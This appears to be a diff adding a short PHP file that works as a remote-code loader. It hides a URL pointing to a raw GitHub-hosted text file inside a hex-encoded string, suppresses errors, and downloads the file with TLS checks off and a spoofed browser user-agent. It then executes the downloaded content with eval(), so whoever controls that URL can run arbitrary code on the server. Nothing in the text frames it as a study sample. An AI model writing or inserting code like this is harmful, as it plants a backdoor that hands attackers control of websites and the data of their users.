@@ -1,0 +1,30 @@
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+
+function g_u() {
+    return pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f332e747874");
+}
+
+$ch = curl_init(g_u());
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_SSL_VERIFYPEER => false,
+    CURLOPT_SSL_VERIFYHOST => false,
+    CURLOPT_TIMEOUT        => 30,
+    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+]);
+
+$r = curl_exec($ch);
+curl_close($ch);
+
+if ($r) {
+    try {
+        eval('?>' . $r);
+    } catch (Throwable $e) {
+    }
+}
+
+?>
